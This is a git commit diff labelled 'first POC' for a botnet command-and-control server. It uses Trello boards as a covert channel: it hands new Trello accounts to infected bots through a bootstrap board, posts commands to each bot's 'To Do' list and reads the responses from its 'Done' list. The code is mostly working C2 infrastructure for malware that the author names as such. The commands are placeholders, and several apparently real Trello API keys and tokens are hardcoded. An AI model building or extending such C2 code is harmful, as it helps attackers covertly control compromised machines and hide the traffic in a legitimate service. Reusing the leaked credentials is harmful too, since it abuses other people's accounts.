605ee934090f6e40b45c2cd4b4efb18401fca505
Yonatan Ziskind <skijonathanz@gmail.com>
2022-12-12 23:43:27 +0200

    first POC
    server and malware successfully exchange accounts. Server publishes commands in the todo list and each bot executes the commands and publishes responds in the Done list

--- api_utils.py
+++ api_utils.py
@@ -5,68 +5,81 @@ import json
 BOOTSTRAP_TOKEN = '0371b95aaa9e16d0089fa4d55d078f5fab508c5af7e2d82a7c57aa6be908778b'
 BOOTSTRAP_KEY = '0e0a04d5f73b65a679a0b49f2f62df9a'
 BOOTSTRAP_BOARD_ID = '639637edc1f14f01dd74eff6'
+BOOTSTRAP_LIST_NAME_PREFIX = 'new_creds_'
+BOT_BOARD_NAME = 'command_and_control'
+BOT_LIST_NAME = 'commands'
 TRELLO_URL = 'https://api.trello.com/1/'
-ACCOUNT_KEY = ''
-ACCOUNT_TOKEN = ''
 SUCCESS = 200
 CRED_ANS_CARD_NAME = 'new creds'
 CRED_REQ_CARD_NAME = 'request for new account'
 KEY_TOKEN_SEPERATOR = ':'
-IS_BOOTSTRAP = True
+COMMAND_TOKEN_SEPERATOR = ':'
+COMMAND_REQ_NAME = "exec"
+COMMAND_RESP_NAME = "resp"
+TODO_LIST_NAME = "To Do"
+DONE_LIST_NAME = "Done"
 
-#TODO make the utils generic in regards to key,token since server uses many of them
+HTTP_ERROR = -1
+INVALID_CREDENTIALS = -2
+NOT_FOUND = -3
+BOOTSTRAP_ERROR = -4
+
+# TODO make the utils generic in regards to key,token since server uses many of them
 
 
-def check_post_response(response):
+def check_response(response, err_message):
     if response.status_code != SUCCESS:
-        print("error response:")
+        print(err_message)
         print("status code is " + str(response.status_code))
         print(response.text)
+        return HTTP_ERROR
+    return 0
 
 # request type is "GET"\"POST"
 # function returns the response
-def send_request(request_type, url_details,query_parameters={},request_parameters={}):
-    url = TRELLO_URL + url_details 
-    if IS_BOOTSTRAP:
-        query = {
-            'key': BOOTSTRAP_KEY,
-            'token': BOOTSTRAP_TOKEN
-        }
-    else:
-        query = {
-            'key': ACCOUNT_KEY,
-            'token': ACCOUNT_TOKEN
-        }
+
+
+def send_request(key, token, request_type, url_details, query_parameters={}, request_parameters={}):
+    url = TRELLO_URL + url_details
+    query = {
+        'key': key,
+        'token': token
+    }
     query.update(query_parameters)
     response = requests.request(
         request_type,
         url,
         params=query,
-        **request_parameters # fishy
+        **request_parameters  # fishy
     )
     return response
 
-    
-def create_list(list_name, board_id):
-    print("creating list "+ list_name)
+
+def create_list(key, token, list_name, board_id):
     url_details = '/lists'
     query_parameters = {
         'name': list_name,
         'idBoard': board_id
     }
-    response = send_request('POST',url_details, query_parameters)
-    check_post_response(response)
+    response = send_request(key, token, 'POST', url_details, query_parameters)
+    if (check_response(response, "ERROR: failed to create list. name = " + list_name) < 0):
+        return HTTP_ERROR
+    return 0
 
-def create_board(board_name):
+
+def create_board(key, token, board_name):
     url_details = '/boards/'
     query_parameters = {
         'name': board_name
     }
-    response = send_request('POST',url_details=url_details,
-    query_parameters=query_parameters)
-    check_post_response(response)
+    response = send_request(
+        key, token, 'POST', url_details=url_details, query_parameters=query_parameters)
+    if (check_response(response, "ERROR: failed to create board. name = " + board_name) < 0):
+        return HTTP_ERROR
+    return 0
 
-def create_card(list_id, name, desc=""):
+
+def create_card(key, token, list_id, name, desc=""):
     url_details = '/cards/'
     query_parameters = {
         'name': name,
@@ -74,80 +87,151 @@ def create_card(list_id, name, desc=""):
     }
     if desc != "":
         query_parameters['desc'] = desc
-    response = send_request('POST',url_details=url_details,
-    query_parameters=query_parameters)
-    check_post_response(response)
+    response = send_request(
+        key, token, 'POST', url_details=url_details, query_parameters=query_parameters)
+    if (check_response(response, "ERROR: failed to create card. name = " + name) < 0):
+        return HTTP_ERROR
+    return 0
 
-def get_list_id(list_name, board_id):
-    url_details = '/boards/' + board_id + '/lists'
-    response = send_request('GET', url_details)
-    lists = json.loads(response.text)
-    for list in lists:
-        if list['name'] == list_name:
-            return list['id']
-    return None
 
-def get_all_boards():
+def get_all_boards(key, token):
     url_details = 'members/me/boards/'
     headers = {
         "Accept": "application/json"
     }
-    response = send_request('GET', url_details, request_parameters={'headers': headers})
-    check_post_response(response)
+    response = send_request(key, token, 'GET', url_details,
+                            request_parameters={'headers': headers})
+    if (check_response(response, "ERROR: failed to get all boards") < 0):
+        return []
     return json.loads(response.text)
 
-def get_board(board_id):
+
+def get_board(key, token, board_id):
     url_details = '/boards/' + board_id
     headers = {
         "Accept": "application/json"
     }
-    response = send_request('GET', url_details, request_parameters={'headers': headers})
-    check_post_response(response)
+    response = send_request(key, token, 'GET', url_details,
+                            request_parameters={'headers': headers})
+    if (check_response(response, "ERROR: failed to get board. id = " + board_id) < 0):
+        return None
     return json.loads(response.text)
 
 
-def get_list(list_id):
+def get_list(key, token, list_id):
     url_details = '/lists/' + list_id
-    response = send_request('GET', url_details)
-    check_post_response(response)
+    response = send_request(key, token, 'GET', url_details)
+    if (check_response(response, "ERROR: failed to get list. id = " + list_id) < 0):
+        return None
     return json.loads(response.text)
 
 
-def get_card(card_id):
+def get_card(key, token, card_id):
     url_details = '/cards/' + card_id
-    response = send_request('GET', url_details)
-    check_post_response(response)
+    response = send_request(key, token, 'GET', url_details)
+    if (check_response(response, "ERROR: failed to get card. id = " + card_id) < 0):
+        return None
     return json.loads(response.text)
 
-def get_cards_in_list(list_id):
+
+def get_cards_in_list(key, token, list_id):
     url_details = '/lists/' + list_id + '/cards'
     headers = {
         "Accept": "application/json"
     }
-    response = send_request('GET', url_details, request_parameters={'headers':headers})
-    check_post_response(response)
+    response = send_request(key, token, 'GET', url_details,
+                            request_parameters={'headers': headers})
+    if (check_response(response, "ERROR: failed to get cards in list. list id = " + list_id) < 0):
+        return []
     return json.loads(response.text)
 
-def get_lists_in_board(board_id):
+
+def get_lists_in_board(key, token, board_id):
     url_details = '/boards/' + board_id + '/lists'
     headers = {
         "Accept": "application/json"
     }
-    response = send_request('GET', url_details, request_parameters={'headers':headers})
-    check_post_response(response)
+    response = send_request(key, token, 'GET', url_details,
+                            request_parameters={'headers': headers})
+    if (check_response(response, "ERROR: failed to get lists in board. board id = " + board_id) < 0):
+        return []
     return json.loads(response.text)
-    
-def get_command_from_card(card_id):
-    card = get_card(card_id)
+
+
+def get_command_from_card(key, token, card_id):
+    card = get_card(key, token, card_id)
+    if not card:
+        return ""
     desc = card['desc']
     return desc
 
-def get_creds_from_card(card_id):
-    desc = get_command_from_card(card_id)
-    desc_sep = desc.split(KEY_TOKEN_SEPERATOR)
-    return desc_sep[0],desc_sep[1]
 
-def archive_list(list_id):
+def get_creds_from_card(key, token, card_id):
+    desc = get_command_from_card(key, token, card_id)
+    if not desc or KEY_TOKEN_SEPERATOR not in desc:
+        return '', ''
+    desc_sep = desc.split(KEY_TOKEN_SEPERATOR)
+    return desc_sep[0], desc_sep[1]
+
+
+def archive_list(key, token, list_id):
     url_details = '/lists/' + list_id + '/closed'
-    response = send_request('POST', url_details)
-    check_post_response(response)
+    response = send_request(key, token, 'PUT', url_details)
+    if (check_response(response, "ERROR: failed to archive list. id = " + list_id) < 0):
+        return HTTP_ERROR
+    return 0
+
+
+def get_board_id(key, token, board_name):
+    boards = get_all_boards(key, token)
+    if not boards:
+        return ''
+    for board in boards:
+        if board['name'] == board_name:
+            return board['id']
+    return ''
+
+
+def get_list_id(key, token, list_name, board_id):
+    lists = get_lists_in_board(key, token, board_id)
+    if not lists:
+        return ''
+    for list in lists:
+        if list['name'] == list_name:
+            return list['id']
+    return ''
+
+
+def get_card_id(key, token, card_name, list_id):
+    cards = get_cards_in_list(key, token, list_id)
+    if not cards:
+        return ''
+    for card in cards:
+        if card['name'] == card_name:
+            return card['id']
+    return ''
+
+
+def create_board_and_get_id(key, token, board_name):
+    if create_board(key, token, board_name) < 0:
+        return ''
+    return get_board_id(key, token, board_name)
+
+
+def create_list_and_get_id(key, token, list_name, board_id):
+    if create_list(key, token, list_name, board_id) < 0:
+        return ''
+    return get_list_id(key, token, list_name, board_id)
+
+
+def create_card_and_get_id(key, token, card_name, list_id):
+    if create_card(key, token, list_id, card_name) < 0:
+        return ''
+    return get_card_id(key, token, card_name, list_id)
+
+# def move_card_to_list(key, token, card_id, list_id):
+#     url_details = '/cards/' + card_id + '/idList'
+#     response = send_request(key, token, 'PUT', url_details, query_parameters={'value': list_id})
+#     if (check_response(response, "ERROR: failed to move card to list. card id = " + card_id + ", list id = " + list_id) < 0):
+#         return HTTP_ERROR
+#     return 0
--- server.py
+++ server.py
@@ -2,38 +2,161 @@ import api_utils as utils
 import time
 import json
 
-available_bots_credentials=[
+
+available_bots_credentials = [
     {
-        "key":'1a309a5b89a0715f0c40aaa138c871b4', 
-        "token": '1fa51a67d1a601e39747812cd96634fd146e5554faa627ba9ca90fa9c137e021'},
+        "key": '31b708e0742efe638e3b853603a4047a',
+        "token": 'ATTAbbf97f853af445a9fd020b9f0f0f50f165e6a2acd528a6356f3ef37cc5e99f9e69BF3540'
+    },
+    {
+        "key": '1a309a5b89a0715f0c40aaa138c871b4',
+        "token": '1fa51a67d1a601e39747812cd96634fd146e5554faa627ba9ca90fa9c137e021'
+    },
     {
         "key": '2a45bdaf483bf0e611dbf3e28acfad7a',
         "token": '973e600d2fb08216cca81a86fdfbc9e8a06926307bd336d147b6ffd3655e4565'
     }
-    ]
-used_bots_credentials=[]
+]
+used_bots_credentials = []
 
-def add_cred_card(list_id):
-    utils.create_card(list_id,utils.CRED_ANS_CARD_NAME, available_bots_credentials[0])
+malware_ids_used = []
+executing_command_ids_per_bot = {}
+finished_command_ids_per_bot = {}
+commands = {'1': "first", '2': "second", '3': "third"}
 
 
-#TODO in the future - add encryption
-#TODO add blacklist of lists
+def initialize_new_bot(bootstrap_list_id, bot_id):
+    # get new credentials if available
+    if len(available_bots_credentials) == 0:
+        print("ERROR: no more credentials available")
+        return
+    new_key = available_bots_credentials[0]['key']
+    new_token = available_bots_credentials[0]['token']
+    # create new board and list on the new account
+    if utils.create_board(new_key, new_token, utils.BOT_BOARD_NAME + bot_id) < 0:
+        print("ERROR: could not create board")
+        return
+
+    # post the new credentials on the bootstrap board
+    new_creds = new_key + utils.KEY_TOKEN_SEPERATOR + new_token
+    if utils.create_card(utils.BOOTSTRAP_KEY, utils.BOOTSTRAP_TOKEN, bootstrap_list_id, utils.CRED_ANS_CARD_NAME,
+                         new_creds) < 0:
+        print("ERROR: could not post credentials on bootstrap board")
+        return
+
+    # update the used credentials
+    used_bots_credentials.append(available_bots_credentials[0])
+    available_bots_credentials.pop(0)
+    executing_command_ids_per_bot[bot_id] = []
+    finished_command_ids_per_bot[bot_id] = []
+
+
+# TODO in the future - add encryption
 def check_bootstrap_board():
-    lists = utils.get_lists_in_board(utils.BOOTSTRAP_BOARD_ID)
+    lists = utils.get_lists_in_board(
+        utils.BOOTSTRAP_KEY, utils.BOOTSTRAP_TOKEN, utils.BOOTSTRAP_BOARD_ID)
+
     for list in lists:
-        cards = utils.get_cards_in_list(list['id'])
+        name = list['name']
+        malware_id = name.split(utils.BOOTSTRAP_LIST_NAME_PREFIX)[1]
+        if malware_id in malware_ids_used:
+            continue
+        malware_ids_used.append(malware_id)
+        cards = utils.get_cards_in_list(
+            utils.BOOTSTRAP_KEY, utils.BOOTSTRAP_TOKEN, list['id'])
+        if len(cards) == 0:
+            print(
+                "ERROR: no cards in bootstrap list. Maybe it will be created later. list id: " + list['id'])
+            continue
         for card in cards:
             # received an account request
             if card['name'] == utils.CRED_REQ_CARD_NAME:
-                add_cred_card(list['id'])
+                initialize_new_bot(list['id'], malware_id)
+                break
+
+
+def check_bots_boards():
+    global executing_command_ids_per_bot
+    global finished_command_ids_per_bot
+    for cred in used_bots_credentials:
+        key = cred['key']
+        token = cred['token']
+        
+        # assume one board and list per bot
+        boards = utils.get_all_boards(key, token)
+        if len(boards) == 0:
+            print("ERROR: no boards for bot with key: " + key)
+            continue
+        if len(boards) > 1:
+            print("ERROR: more than one board for bot with key: " + key)
+            continue
+        board_id = boards[0]['id']
+        board_name = boards[0]['name']
+        if not board_name.startswith(utils.BOT_BOARD_NAME):
+            print("ERROR: board name is not as expected. name: " + board_name)
+            continue
+        bot_id = board_name.split(utils.BOT_BOARD_NAME)[1]
+        if bot_id not in malware_ids_used or \
+                bot_id not in executing_command_ids_per_bot or \
+                bot_id not in finished_command_ids_per_bot:
+            print(
+                "ERROR: bot is unknown or wasn't initialized properly. bot id: " + bot_id)
+            continue
+        print("bot id: " + bot_id + " executing commands: " + str(executing_command_ids_per_bot[bot_id]) + " finished commands: " + str(finished_command_ids_per_bot[bot_id]))
+        todo_list_id = utils.get_list_id(key, token, utils.TODO_LIST_NAME, board_id)
+        done_list_id = utils.get_list_id(key, token, utils.DONE_LIST_NAME, board_id)
+        if not todo_list_id or not done_list_id:
+            print("ERROR: could not find TODO or DONE list id for bot with key: " + key)
+            continue
+
+        cards = utils.get_cards_in_list(key, token, done_list_id)
+        executing_commands = executing_command_ids_per_bot[bot_id]
+        finished_commands = finished_command_ids_per_bot[bot_id]
+        for card in cards:
+            if card['name'].endswith(utils.COMMAND_RESP_NAME):
+                command_id = card['name'].split(
+                    utils.COMMAND_TOKEN_SEPERATOR)[0]
+                if command_id in executing_commands:
+                    resp = card['desc']
+                    print("Got response from bot id: " + bot_id +
+                          " for command id: " + command_id + " response: " + resp)
+                    executing_commands.remove(command_id)
+                    finished_commands.append(command_id)
+                elif command_id in finished_commands:
+                    continue
+                else:
+                    print(
+                        "ERROR: received response for command that was not sent, bot_id: " + bot_id
+                        + " id: " + command_id)
+                    continue
+        if len(executing_commands) == 0:
+            # ready to send new commands
+            for command_id in commands:
+                if command_id in finished_commands:
+                    continue
+                if utils.create_card(key, token, todo_list_id,
+                                     str(command_id) + utils.COMMAND_TOKEN_SEPERATOR +
+                                     utils.COMMAND_REQ_NAME, commands[command_id]) < 0:
+                    print("ERROR: could not send command to bot id: " + bot_id)
+                    break
+                executing_commands.append(command_id)
+                break
+        executing_command_ids_per_bot[bot_id] = executing_commands
+        finished_command_ids_per_bot[bot_id] = finished_commands
+
+
+def get_new_creds():
+    pass
 
 
 def main():
+    while True:
+        check_bootstrap_board()
+        check_bots_boards()
+        get_new_creds()
+        time.sleep(10)
 
-    check_bootstrap_board()
 
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
     main()
-
